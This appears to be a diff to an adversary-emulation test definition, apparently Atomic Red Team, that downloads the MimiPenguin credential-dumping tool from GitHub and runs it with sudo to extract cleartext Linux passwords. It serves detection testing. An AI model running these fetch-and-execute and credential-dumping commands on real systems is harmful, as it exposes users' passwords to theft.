@@ -166,42 +166,23 @@ atomic_tests:
     MimiPenguin_Location:
       description: Path of MimiPenguin script
       type: path
-      default: /tmp
-  dependency_executor_name: sh
+      default: PathToAtomicsFolder/../ExternalPayloads/mimipenguin/mimipenguin.sh
   dependencies:
   - description: |
       MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})
     prereq_command: |
       if [ -f "#{MimiPenguin_Location}" ]; then exit 0; else exit 1; fi;
     get_prereq_command: |
-      mkdir -p #{MimiPenguin_Location}/mimipenguin
-      wget -O "#{MimiPenguin_Location}/mimipenguin.tar.gz" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
-      tar -xzvf "#{MimiPenguin_Location}/mimipenguin.tar.gz" -C #{MimiPenguin_Location}/mimipenguin
-  - description: |
-      Strings must be installed
-    prereq_command: |
-      if [ -x "$(command -v strings --version)" ]; then exit 0; else exit 1; fi;
-    get_prereq_command: |
-      sudo apt-get -y install binutils
-  - description: |
-      Python2 must be installed
-    prereq_command: |
-      if [ -x "$(command -v python2 --version)" ]; then exit 0; else exit 1; fi;
-    get_prereq_command: |
-      sudo apt-get -y install python2
-  - description: |
-      Libc-bin must be installed
-    prereq_command: |
-      if [ -x "$(command -v ldd --version)" ]; then exit 0; else exit 1; fi;
-    get_prereq_command: |
-      sudo apt-get -y install libc-bin
+      payload_dir=$(dirname "#{MimiPenguin_Location}")
+      mkdir -p "$payload_dir"
+      wget -O "$payload_dir/mimipenguin.tar.gz" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
+      tar -xzf "$payload_dir/mimipenguin.tar.gz" --strip-components=1 -C "$payload_dir"
   executor:
     command: |
-      sudo bash #{MimiPenguin_Location}/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh > #{output_file}
-      cat #{output_file}
+      sudo bash "#{MimiPenguin_Location}" > "#{output_file}"
+      cat "#{output_file}"
     cleanup_command: |
       rm -f #{output_file} > /dev/null
-      rm -f #{MimiPenguin_Location}/mimipenguin.tar.gz
-      rm -rf #{MimiPenguin_Location}/mimipenguin
+      rm -rf $(dirname "#{MimiPenguin_Location}")
     name: bash
     elevation_required: true
